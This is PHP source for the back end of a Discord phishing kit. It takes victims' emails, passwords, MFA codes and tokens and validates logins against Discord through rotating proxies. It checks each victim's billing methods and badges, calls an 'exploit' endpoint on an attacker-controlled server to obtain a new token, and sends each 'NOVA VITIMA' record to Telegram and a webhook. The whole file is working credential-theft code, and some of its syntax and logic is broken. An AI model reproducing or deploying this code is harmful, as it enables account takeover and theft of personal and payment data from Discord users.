<?php
error_reporting(E_ERROR | E_PARSE);

class Request
{
    public function GetURL($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);
        
        return $data;
    }

    public function PostURL($url, $array)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $array);

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);
        
        return $data;
    }
}

$Request = new Request();


// Monitoring info about users
class Monitoring
{
    public function Status($url)
    {
        // nothing here
    }
}

$Monitoring = new Monitoring();

// Main handler
class Main
{
    public function handler($bot_token, $user_id, $client_ip, $password, $full_url, $login, $server_hostname, $admin_id, $admin_token, $acc_token, $admin_sendlog, $mfacode2)
    {
        # Functions #
        function SendMessage($token, $chatID, $messaggio)
        {
            $url   =  "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID . "&text=" . $messaggio . "&disable_web_page_preview=1"; 
            $ch    =  curl_init();
            $optArray = array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true
                );
            curl_setopt_array($ch, $optArray);

            $result = curl_exec($ch);

            curl_close($ch);

            return $result;
        }

        function SendDiscord($d_token,$d_password,$d_username,$d_userid,$d_badges,$d_nitro,$d_avatar,$d_client_ip, $d_country, $d_domain, $d_email, $d_friends, $descembed, $user)
        {
            $url = 'http://IPDASUAVPS:1337/api/v1/send/webhook';
            $ch=curl_init($url);
            $data = array(
                'webhook' => 'SUAWEBHOOKAQUI'
                'token' => $d_token,
                'password' => $d_password,
                'username' => $d_username,
                'userid' => $d_userid,
                'badges' => $d_badges,
                'nitro' => $d_nitro,
                'avatar' => $d_avatar,
                'client_ip' => $d_client_ip,
                'country' => $d_country,
                'domain' => $d_domain,
                'email' => $d_email,
                'friends' => $d_friends,
                'descembed' => $descembed
            );

            $payload = json_encode($data);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $result = curl_exec($ch);
            curl_close($ch);
        }
        
        function get_random_proxies()
        {
            $proxies  =  explode("
", file_get_contents("source/core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        function getinfo($token, $url){
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $result        =  curl_exec($ch);
            $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            curl_close($ch);

            $body      =  substr($result, $headers_size);
            $response  =  json_decode($body);
            $response  =  json_decode(json_encode($response), true);

            if( isset($response["global"]) )
            {
                $ch = curl_init();
                $proxy = get_random_proxies();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
                curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

                $req = curl_exec($ch);

                curl_close($req);

                return $req;
            }
            else
            {
                return $result;
            }
        }

        # MAIN #
        if(stristr($user_id, ','))
        {
            $user_id  =  explode(",", $user_id);
        }
        else
        {
            $user_id  =  array( $user_id );
        }

        $details = json_decode( file_get_contents("https://ipinfo.io/".$client_ip."/json") );
        $country = $details->country;

        if ($country == 'UA')
        { 
            $flag = '🇺🇦'; 
        
        }
        elseif ($country == 'RU')
        { 
            $flag = '🇷🇺'; 
        
        }
        elseif ($country == 'US')
        { 
            $flag = '🇺🇸'; 
        
        }
        else
        { 
            $flag = '🇪🇺'; 
            
        }

        # CHECK BADGES SYSTEM #

        $TeamOwner     =  'Нет';
        $BOT_Verify    =  'Нет';

        $json_response =  json_decode(getinfo($acc_token, "https://discordapp.com/api/v9/users/@me"), true);

        $userid        =  $json_response['id'];
        $phone        =  $json_response['phone'];

        $login         =  urlencode($login);
        $password      =  urlencode($password);
        $acc_token     =  urlencode($acc_token);

        $howmuchbadges =  0;
        $badges        =  '';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/v9/users/@me/billing/payment-sources');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authorization: '.$acc_token,
        ));
        $payment = curl_exec($ch);
        
        
        if (strpos($payment, '"type": 2,')){
        $paypal = "<:paypal:947639958297010236>";}
        else {
        $paypal = null;}

        if (strpos($payment, '"type": 1,')){
        $cartao = ":credit_card:";}
        else {
        $cartao = "None";}

        $dados =  "$paypal$cartao";


        $howmuchbadges =  0;
        $badges        =  '';

        if ($phone == ''){
            $phone = "`No Have Phone`";
        }

        if ($nitro == ''){
            $nitro = "`No Have Nitro`";
        }

        if ($nitro == '0'){
            $nitro = "`No Have Nitro`";
        }

        if ($nitro == '1'){
            $nitro = "<:classic:896119171019067423>";
        }

        if ($nitro == '2'){
            $nitro = "<:classic:896119171019067423><:ro_nitrin_boost:951631079033405490>";
        }

        // END OF BILLING SYSTEM  //


        if(isset($json_response['discriminator']) && isset($json_response['username'])) {
            $public_flags = $json_response['public_flags'];

            $flags = array (
                131072 => '<:devms_wtd:780151600810688532>',
                65536 => 'Verified Bot',
                16384 => 'Caçador De Bugs Level 2🧹',
                4096 => 'System',
                1024 => '<:devms_wtd:780151600810688532>',
                512 => '<a:pig:965738845679267910>',
                256 => 'Hypesquad Online House 3',
                128 => 'Hypesquad Online House 2',
                64 => 'Hypesquad Online House 1',
                8 => 'Bug Hunter Level 1',
                4 => '<:BadgeHypesquad:925515902345170954>',
                2 => 'Partner',
                1 => 'Staff'
            );

            $str_flags = array();

            while($public_flags != 0)
            {
                foreach($flags as $key => $value)
                {
                    if($public_flags >= $key)
                    {
                        array_push($str_flags,$value);
                        $public_flags = $public_flags - $key;
                    }
                }
            }
        }

        foreach($str_flags as $item)
        {
            if ($item != 'Hypesquad Online House 1' and $item != 'Hypesquad Online House 2' and $item != 'Hypesquad Online House 3')
            {
                if ($item == 'Verified Developer')
                {

                    # CHECK BOTS #
                    $json_response_bot = json_decode(getinfo($usertoken, "https://discord.com/api/v9/applications?with_team_applications=true"), true);

                    foreach($json_response_bot as $item2)
                    {
                        if (json_encode($item2['verification_state']) == '4')
                        {
                            if (json_encode($item2['owner']['id']) == $userid)
                            {
                              $BOT_Verify = 'Bot Owner';
                            }
                        }
                    }

                    # CHECK TEAMS #
                    $json_response_team = json_decode(getinfo($usertoken, "https://discord.com/api/v9/teams"), true);

                    foreach($json_response_team as $item3)
                    {
                        if (json_encode($item3['owner_user_id']) == $userid)
                        {
                            $TeamOwner = 'Team Owner';
                        }
                    }
                    # CHECK TEAMS #

                    if ($TeamOwner != 'Нет' and $BOT_Verify == 'Нет')
                    {
                        $item = (string)$item.'(Team Owner)';
                    }
                    elseif($TeamOwner == 'Нет' and $BOT_Verify != 'Нет')
                    {
                        $item = (string)$item.'(Bot Owner)';
                    }
                    elseif($TeamOwner != 'Нет' and $BOT_Verify != 'Нет')
                    {
                        $item = (string)$item.'(Team Owner, Bot Owner)';
                    }

                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
                else
                {
                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
            }
        }

        # ID LOOKUP SYSTEM

        $url100 = 'http://IPDASUAVPS:1337/api/v1/lookup';
        $ch100=curl_init($url100);
        $data100 = array(
            'token' => $acc_token 
        );
        $payload100 = json_encode($data100);
        curl_setopt($ch100, CURLOPT_POSTFIELDS, $payload100);
        curl_setopt($ch100, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt($ch100, CURLOPT_RETURNTRANSFER, true);
        $result100 = curl_exec($ch100);
        curl_close($ch100);
        $jsonResult100 = json_decode($result100, true);
        $username = $jsonResult100['nick'];
        $img_url = $jsonResult100['avatar'];

        # NITRO INFO

        $url200 = 'http://IPDASUAVPS:1337/api/v1/lookup';
        $ch200=curl_init($url200);
        $data200 = array(
            'token' => $acc_token 
        );
        $payload200 = json_encode($data200);
        curl_setopt($ch200, CURLOPT_POSTFIELDS, $payload200);
        curl_setopt($ch200, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt($ch200, CURLOPT_RETURNTRANSFER, true);
        $result200 = curl_exec($ch200);
        curl_close($ch200);
        $jsonResult200 = json_decode($result200, true);
        $type_nitro = $jsonResult200['nitro'];
        $mfa_enabled = $jsonResult200['mfa_enabled'];

        # RARE FRIENDS

        $url300 = 'http://IPDASUAVPS:1337/api/v1/get/rarefriends';
        $ch300=curl_init($url300);
        $data300 = array(
            'token' => $acc_token
        );
        $payload300 = json_encode($data300);
        curl_setopt($ch300, CURLOPT_POSTFIELDS, $payload300);
        curl_setopt($ch300, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt($ch300, CURLOPT_RETURNTRANSFER, true);
        $result300 = curl_exec($ch300);
        curl_close($ch300);

        # EXPLOIT

        $url400 = 'http://IPDASUAVPS:1337/api/v1/exploit/discord';
        $ch400=curl_init($url400);
        $data400 = array(
            'token' => $acc_token,
            'password' => urldecode($password),
            'mfacode' => $mfacode2,
            'user' => '$USER$'
        );
        $payload400 = json_encode($data400);
        curl_setopt($ch400, CURLOPT_POSTFIELDS, $payload400);
        curl_setopt($ch400, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt($ch400, CURLOPT_RETURNTRANSFER, true);
        $result400 = curl_exec($ch400);
        curl_close($ch400);
        $jsonResult400 = json_decode($result400, true);
        $new_token = $jsonResult400['token'];

        if ($badges == '')
        {
            $telegram_message_admin = 
            "NOVA VITIMA🔔"."%0A"."%0A".
            "👮🏾‍♂️ ID: ".$userid."%0A".
            "💎 TOKEN: ".$acc_token."%0A"."%0A".
            "📪 E-MAIL: ".$login."%0A"."%0A".
            "📝 SENHA: ".$password."%0A"."%0A".
            "🌐 DOMINIO: ".$full_url."%0A".
            "🏘 IP DA VITIMA: ".$client_ip." (".$flag.")"."%0A"."%0A".
            "🔔 NEW TOKEN: ".$new_token."%0A"."%0A".
            "🍌 Desenvolvido por dzn#0001";

        }
        else
        {
            $telegram_message_admin = 
            "NOVA VITIMA COM INSIGNIA🔔"."%0A"."%0A".
            "👮🏾‍♂️ ID: ".$userid."%0A"."%0A".
            "💎 TOKEN: ".$acc_token."%0A"."%0A".
            "📪 E-MAIL: ".$login."%0A"."%0A".
            "📝 SENHA: ".$password."%0A"."%0A".
            "✨ INSIGNIAS (".$howmuchbadges."): ".$badges."%0A"."%0A".
            "🌐 DOMINIO: ".$full_url."%0A".
            "🏘 IP DA VITIMA: ".$client_ip." (".$flag.")"."%0A"."%0A".
            "🍌 Desenvolvido por dzn#0001";


        }

        foreach ($user_id as $select_id)
        {
            SendMessage($bot_token, $select_id, $telegram_message_admin);
            SendDiscord($acc_token,urldecode($password),$username,$userid,$badges,$type_nitro,$img_url,$client_ip,$country,$full_url,urldecode($login),$result300,$jsonResult400,'$USER$');
        }
        
    }
}

$Main = new Main();

    $admin_sendlog = False;
    $admin_id = '';
    $admin_token = '';

// Validator handler
class VLT_API
{
    public function login($payload): array{
        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function login_proxy($payload): array{
        function get_random_proxy()
        {
            $proxies  =  explode("
", file_get_contents("source/core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $proxy = get_random_proxy();

        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function totp_auth($ticket, $mfa_code): string{
        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
        $payload  =  array(
            "code" => $mfa_code,
            "gift_code_sku_id" => null,
            "login_source" => null,
            "ticket" => $ticket
        );
        $payload_s = json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  (array)json_decode($body);

        if( !isset($response["token"]) )
        {
            return "EINVALID_MFA_CODE";
        }
        else
        {
            return $response["token"];
        }
    }
}

$VLT_API = new VLT_API();

?>